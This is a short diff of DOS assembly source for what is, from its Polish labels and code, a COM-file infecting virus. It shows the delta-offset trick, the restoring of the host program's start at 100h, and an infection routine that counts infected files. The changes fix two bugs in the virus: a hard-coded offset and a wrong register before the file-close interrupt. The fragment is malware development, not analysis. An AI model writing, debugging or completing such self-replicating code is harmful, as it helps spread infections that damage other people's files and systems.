@@ -26,7 +26,7 @@ przesuniecie:
 ; pobranie rejestru ip do bp
   pop bp
 ; cofnięcie do instrukcji plik_zarazanie, instrukcja call zajmuje 3B
-  sub bp, 3h
+  sub bp, przesuniecie
   lea si, [bp + plik_poczatek]
   mov di, 100h
   push di
@@ -96,7 +96,7 @@ zarazanie:
   int 21h
   inc [bp + licznik]
 plik_zamknij:
-  mov ax, P21H_PLIK_ZAMKNIJ
+  mov ah, P21H_PLIK_ZAMKNIJ
   int 21h
 zarazanie_koniec:
   ret
